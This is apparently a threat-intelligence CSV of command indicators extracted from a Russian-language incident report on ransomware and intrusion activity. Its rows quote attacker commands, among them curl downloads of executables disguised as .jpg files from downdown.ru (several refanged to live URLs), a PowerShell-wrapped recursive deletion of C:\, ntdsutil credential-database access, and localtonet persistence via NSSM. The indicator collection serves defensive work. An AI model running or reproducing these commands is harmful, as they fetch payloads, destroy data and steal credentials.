schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:b8fd1c3905b2693f0b013aa0a7c11a02ff5e7a69a0bc7118b54a8ae2f2c3fb39,observation--sha256:fd399b70ad2c7b945dd943f0c8988bfaddd92d28fe300763981765e59f85356a,command,"Actions"" = ""powershell.exe out-file -inputobject (cmd /c rmdir /q /s c:\","Actions"" = ""powershell.exe out-file -inputobject (cmd /c rmdir /q /s c:\",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 75}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1543.003 Windows Service Для закрепления Crypt Ghouls установили localtonet в качестве службы Windows. Чтобы создать службу, атакующие использовали утилиту NSSM, которую можно скачать с сайта localtonet, что атакующие и сделали: Установка localtonet через NSSM: Persistence hxxp://localtonet[.]com/nssm-2.24.zip hxxp://localtonet[.]com/download/localtonet-win-64.zip C:\Windows\Temp\nssm-2.24\win64\nssm.exe install L2_SVC C:\Windows\Temp\ localtonet.exe authtoken [redacted] C:\Windows\Temp\nssm-2.",
1.0.0,actor--anonymous,artifact--sha256:b9b822afb7ac2df9cc4fbcc09cf99d06305c81a75fd1569c9cc3bdb5ec7ed22d,observation--sha256:678826066ed5b20ecc48ced10d30e6e448d502618537ff30d7ac84cc0b7d8ee4,command,"Actions"" = ""powershell.exe out-file -inputobject (ntdsutil.exe 'ac i","Actions"" = ""powershell.exe out-file -inputobject (ntdsutil.exe 'ac i",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 75}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1543.003 Windows Service Для закрепления Crypt Ghouls установили localtonet в качестве службы Windows. Чтобы создать службу, атакующие использовали утилиту NSSM, которую можно скачать с сайта localtonet, что атакующие и сделали: Установка localtonet через NSSM: Persistence hxxp://localtonet[.]com/nssm-2.24.zip hxxp://localtonet[.]com/download/localtonet-win-64.zip C:\Windows\Temp\nssm-2.24\win64\nssm.exe install L2_SVC C:\Windows\Temp\ localtonet.exe authtoken [redacted] C:\Windows\Temp\nssm-2.",
1.0.0,actor--anonymous,artifact--sha256:d0c9b70a0587f25cf55495e537053fa749c8a4fdbe39fd2ab211a409b8da0158,observation--sha256:12e9c2351a3cd817c89a5d4764bbbfb04cc8a5c2de017ff18bff7cac47fc68a6,command,"B0523C26BCBF}:Actions, `POWERSHELL.EXE","B0523C26BCBF}:Actions, `POWERSHELL.EXE",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы Имя задачи Командная строка Описание Dead1 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{9042DCD8-1F89-4FC4-8B13- 4D3D5F3AED03}:Actions, `cmd.exe` /c c:\ programdata\twelve.exe -pass [PASS] Запуск шифровальщика через командную строку с передачей пароля в качестве аргумента Dead2 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{AB35C377-2AD2-4",
1.0.0,actor--anonymous,artifact--sha256:8be034d3fd94873d62ce2e165455ad27d53ba311db420e9e7679dcf36e9021e3,observation--sha256:eb75c350e3affcbca7592db32df4d2b33140499bf0087572433b53480ed45429,command,C:\Intel\curl.exe -o C:\Intel\AnyDesk\bat.bat hxxp://downdown[.]ru/bat.jpg,C:\Intel\curl.exe -o C:\Intel\AnyDesk\bat.bat http://downdown.ru/bat.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:74bf385cfb4611f7f1a0ce5cc76c8d123fd1fa94488b96baae04c6d27e56c7c5,observation--sha256:077bd0d8a80cabc998cf09bb458e2850f8a1ae555b84af37aec02f35d4385811,command,C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg,C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:74bf385cfb4611f7f1a0ce5cc76c8d123fd1fa94488b96baae04c6d27e56c7c5,observation--sha256:7997a6920eeeb7c266c3243f427761448a72f0563d8ce57432b1105b0ea0a88a,command,C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg,C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
1.0.0,actor--anonymous,artifact--sha256:ffe7b83394491f4c1addbc8fb4403d60f64b22c13e8975b6ea07091ac1bc350d,observation--sha256:6e8dad679ee412b350705da07e645f797ca19c774d70ab3bb9bb6d83d6a87bfd,command,C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg,C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:ffe7b83394491f4c1addbc8fb4403d60f64b22c13e8975b6ea07091ac1bc350d,observation--sha256:1cae499ddbf54e5dbcb81e751697aea80ec28467a93de20fbca33c2b0651e0de,command,C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg,C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
1.0.0,actor--anonymous,artifact--sha256:c37a1d38d406ea508167d34f389a45310de418b0c70d1b8ecd62867e9b4fc290,observation--sha256:1b6af545c17194e19fbaf1746f7c2dbbd0e375104651f840c1f0e714747a493a,command,C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg,C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:c37a1d38d406ea508167d34f389a45310de418b0c70d1b8ecd62867e9b4fc290,observation--sha256:47d7cf8bf9ccbcca3035a81fc89c8d39badaad394631e2e9d39169f27e5315eb,command,C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg,C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
1.0.0,actor--anonymous,artifact--sha256:ef5243cf08bc0ebd30f4d1f6279a669588dc6d6e0221f086e3a5797c489b9425,observation--sha256:b374f242a82a103e2720534554f0e63242c73d428d8555167b48c57ad675e54f,command,C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg,C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:ef5243cf08bc0ebd30f4d1f6279a669588dc6d6e0221f086e3a5797c489b9425,observation--sha256:e2655eecc72f646750d79876d6e098d71396bc9ecbffd6db5bad1d93535847a5,command,C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg,C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
1.0.0,actor--anonymous,artifact--sha256:d4afbe0f880f01bc2e3a0cade979c8063654e92a9962ec9f8f1afecd5b60d46a,observation--sha256:32e10d00777f15ebcb0d4486170b21030eac1d4506aab66d5ecad662251591de,command,C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg,C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:d4afbe0f880f01bc2e3a0cade979c8063654e92a9962ec9f8f1afecd5b60d46a,observation--sha256:703c5e79768f2015c2c52add2d8f91f2c1676087ce94de3237e644c739bf5133,command,C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg,C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
